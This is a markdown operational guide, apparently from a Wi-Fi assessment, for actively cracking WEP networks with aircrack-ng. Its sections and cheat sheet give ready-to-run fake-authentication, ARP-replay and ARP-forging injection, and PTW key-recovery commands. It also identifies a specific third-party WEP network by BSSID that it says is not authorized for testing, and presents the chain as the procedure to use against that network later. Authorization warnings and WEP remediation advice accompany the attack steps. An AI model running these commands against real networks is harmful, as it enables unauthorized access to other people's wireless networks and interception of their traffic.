# Active WEP Attack Methodology — Authorized Testing Reference

> **Authorization gate (read first).** Every step in this document is an *active, intrusive*
> attack against a wireless network. Do **none** of this against any network you do not own
> or do not have explicit, written authorization to test. In most jurisdictions (e.g. the
> U.S. **Computer Fraud and Abuse Act, 18 U.S.C. §1030**, the U.S. **ECPA, 18 U.S.C. §2511**,
> and equivalent laws elsewhere) unauthorized WEP cracking, ARP injection, and deauth are
> crimes carrying real penalties — regardless of how weak the target's encryption is.
>
> This document is a **training/operational reference for authorized security testing**
> (your own lab AP, an authorized pentest engagement, a CTF range). It is deliberately
> written so a tester can run the full chain against a target they are authorized to test.

This methodology was produced as part of a Wi-Fi airspace assessment. The *passive*
assessment (report `WIFI_VULNERABILITY_REPORT.md`) confirmed a WEP network
(`62:45:B6:E4:A6:12`) at **-91 dBm** and found its **passive IV accumulation rate was 0
IVs/min** — i.e. not crackable passively from that location. The steps below are the
**active** chain that would be required if/when authorization is obtained and the link
budget is fixed (closer proximity / directional antenna).

---

## 0. Preconditions & legality checklist

Confirm **all** of the following before doing anything active:

- [ ] You **own** the target AP, **or** have a signed scope/letter of authorization naming
      the target BSSID/SSID and the test window.
- [ ] You have **written** authorization — verbal is not enough.
- [ ] The target is **in scope** (BSSID/SSID match the authorization exactly).
- [ ] You are operating in a jurisdiction where this is legal under your authorization.
- [ ] You have a **monitor-mode-capable** adapter on a **separate PHY from your uplink**
      (do not attack on your only network interface — you will lose connectivity and
      deauthenticate yourself). Example: keep `wlan0` as managed uplink, use `wlan1`/`wlan1mon`
      for the attack.
- [ ] Link budget is adequate: target RSSI at your adapter should be **≥ ~-70 dBm** for
      reliable injection. At -91 dBm injection reliability is near zero — get closer or use
      a directional antenna before attempting the active steps.

If any box is unchecked, **stop** — do reconnaissance only (passive `airodump-ng`).

---

## 1. Equipment

| Role | Example | Notes |
|------|---------|-------|
| Attack adapter | NetGear A7000 USB (`mt7921u`), Alfa AWUS036ACH/NHA, etc. | Must support **monitor mode + injection**. Verify with `aireplay-ng --test wlan1mon`. |
| Uplink adapter (separate) | any managed Wi-Fi / Ethernet | Keep your own connectivity alive. |
| Optional | directional 2.4 GHz antenna | to fix link budget on weak targets. |

Verify injection capability once in monitor mode:

```bash
sudo airmon-ng start wlan1
sudo aireplay-ng --test wlan1mon          # injection test; should report "Injection is working!"
```

---

## 2. Reconnaissance (passive — always allowed on your own/authorized targets)

Lock onto the target's channel and capture its traffic to a file. WEP targets are 2.4 GHz.

```bash
# Replace <BSSID> with the authorized target, e.g. 62:45:B6:E4:A6:12
# Replace <CH> with the target's channel (from a prior `airodump-ng --band abg` sweep).
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep_target --output-format pcap wlan1mon
```

Leave this running in one terminal for the whole attack — it is both your capture sink and
your live view of: the AP, **any associated client MACs** (you need one for ARP replay), and
the `# Data` column (the live IV count you are trying to grow).

Read off:
- `<BSSID>` (AP MAC) — confirm it matches your authorization.
- `<CH>` (channel) — lock here.
- A **client MAC** (`Station` section) — you need this for ARP replay. If there are no
  associated clients, see §5 (no-client path).

---

## 3. Fake authentication (so the AP accepts your injected frames)

WEP APs ignore frames from unauthenticated stations. Establish a fake-auth association
using your adapter's monitor-mode MAC (the `wlan1mon` MAC, here `--fake-auth` uses it by
default):

```bash
# In a second terminal. <AP_MAC> = target BSSID; <MY_MAC> = wlan1mon's MAC (airmon-ng prints it).
sudo aireplay-ng -1 0 -a <AP_MAC> -e <ESSID> wlan1mon
#   -1 0   : fake auth, retry delay 0s
#   -a     : AP BSSID
#   -e     : ESSID (use the real SSID; for hidden SSIDs, capture it first or use --ignore-negative-one)
# Success looks like: "Sending Fake Auth Request ... Authentication OK ... Association OK :-)"
```

If fake-auth fails repeatedly, possible causes: out of range, AP MAC-filtering enabled,
or the AP requires a real client's MAC (then use a captured client MAC with `-h <CLIENT_MAC>`).

---

## 4. ARP-request replay (the IV firehose — ACTIVE INJECTION)

This is the core active step. It replays captured ARP requests (or forges them) so the AP
re-encrypts them with new WEP IVs, generating IVs ~50–1000× faster than passive capture.

**Path A — with a live associated client (preferred):**

```bash
# Wait for an ARP frame from the client, then replay it forever.
sudo aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan1mon
#   -3       : ARP-request replay attack
#   -b       : AP BSSID
#   -h       : source MAC (a real associated client)
# Watch for "Got a directed ARP request" / "Got an ARP request ... Sending packet"
# Then in your airodump terminal, the `# Data` column should climb rapidly.
```

**Path B — no associated client (forge an ARP request yourself):**

```bash
# Interactive ARP generation. -y uses the previously captured ARP keystream; for a cold
# start you may first need to capture an ARP via the "-3" passive-replay wait above, or
# use "--arpreplay" with a forged ARP if you can derive the keystream.
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <AP_MAC> -h <MY_MAC> wlan1mon
#   -2       : interactive packet replay
#   -p 0841  : frame control (from-DS=0, to-DS=1, data)
#   -c ...   : broadcast destination
# Use this when there is genuinely no client to bounce ARPs off.
```

**Target IV count:** keep replaying until `# Data` (in the airodump terminal) reaches:
- **~40,000–80,000 IVs** for the **PTW** attack (`aircrack-ng -z`) — usually enough, minutes of replay.
- **~500,000–1,000,000 IVs** for the older **FMS/KoreK** statistical attack (only if PTW fails on a weak key).

At a healthy injection rate (~500–1000 IV/s) this is 1–3 minutes; at a poor link budget it
can take an hour or never complete — that is why §0 requires good RSSI.

---

## 5. Crack the key (offline — passive, no further RF activity)

```bash
# PTW attack (preferred; needs far fewer IVs)
aircrack-ng -z -b <AP_MAC> wep_target-01.cap

#   -z        : PTW attack
#   -b        : restrict to this BSSID (filter out other APs in the capture)
# If PTW doesn't recover, fall back to the statistical attack (needs many more IVs):
aircrack-ng -b <AP_MAC> wep_target-01.cap

# Success:
#   "KEY FOUND! [ AA:BB:CC:DD:EE ]"   (hex)  — or an ASCII passphrase
```

The crack is pure CPU/linear-algebra on the capture file — no more RF transmission. You can
copy the `.cap` off the testing machine and crack it elsewhere.

---

## 6. Validate the key (authorized only)

Only do this on an authorized target:

```bash
# Join the WEP network with the recovered key to confirm it is correct.
#   hex key (5/13/16 bytes):  use the hex form with iw/nmcli
sudo nmcli dev wifi connect "<ESSID>" wep-key0 <HEX_OR_ASCII_KEY> ifname wlan0
# Confirm with: ping/curl through the AP. Then disconnect and log it.
```

---

## 7. Cleanup & opsec

```bash
# Stop all attack tools, stop the capture, return the adapter to managed mode.
sudo airmon-ng stop wlan1mon
# Verify: iw dev   -> wlan1 should be back to type managed
# Save the capture + a hash of the recovered key as the engagement artifact:
sha256sum wep_target-01.cap > wep_target-01.cap.sha256
```

Record in the engagement report: target BSSID/SSID, channel, IV count at crack, time to
crack, recovered key (or key hash), and the exact authorization reference.

---

## 8. Why the in-the-wild target was NOT crackable passively (from this assessment)

For the network documented in `WIFI_VULNERABILITY_REPORT.md` (`62:45:B6:E4:A6:12`):

| Factor | Observed | Consequence |
|--------|----------|-------------|
| Signal | **-91 dBm** (very weak) | Injection reliability ~0; fake-auth/replay will not stick |
| Passive IV rate | **0 IVs/min** over ~190 s | Passive PTW collection infeasible (needs 40k+ IVs) |
| Channel IE | **none advertised** (airodump ch `-1`) | Cannot reliably lock dwell channel |
| Authorization | **none** | Active attack would be unlawful regardless of feasibility |

**Conclusion:** the WEP configuration is a genuine critical vulnerability, but it is **not
exploitable from the assessment location** without (a) explicit authorization and (b) a
better link budget (closer proximity / directional antenna). This document is the procedure
an authorized tester would follow once those two preconditions are met.

---

## 9. Defensive takeaway (for the report's remediation section)

WEP must simply be disabled — there is no "strong WEP key." Remediation is unambiguous:
- Disable WEP on the AP.
- Enable **WPA3-Personal (SAE)**; if client devices lack WPA3, use **WPA2-PSK/CCMP** with a
  ≥16-character random passphrase and **PMF required (802.11w)**.
- Retire any AP that cannot do at least WPA2-CCMP — WEP-only hardware is end-of-life.

---

## 10. Tool reference (cheat sheet)

| Goal | Command |
|------|---------|
| Monitor mode | `sudo airmon-ng start wlan1` → `wlan1mon` |
| Injection test | `sudo aireplay-ng --test wlan1mon` |
| Recon/capture | `sudo airodump-ng -c <CH> --bssid <BSSID> -w <prefix> wlan1mon` |
| Fake auth | `sudo aireplay-ng -1 0 -a <AP_MAC> -e <ESSID> wlan1mon` |
| ARP replay (client) | `sudo aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan1mon` |
| ARP forge (no client) | `sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <AP_MAC> -h <MY_MAC> wlan1mon` |
| Crack (PTW) | `aircrack-ng -z -b <AP_MAC> <prefix>-01.cap` |
| Stop monitor | `sudo airmon-ng stop wlan1mon` |

---

*End of methodology. Use only against networks you own or are explicitly authorized to test.*
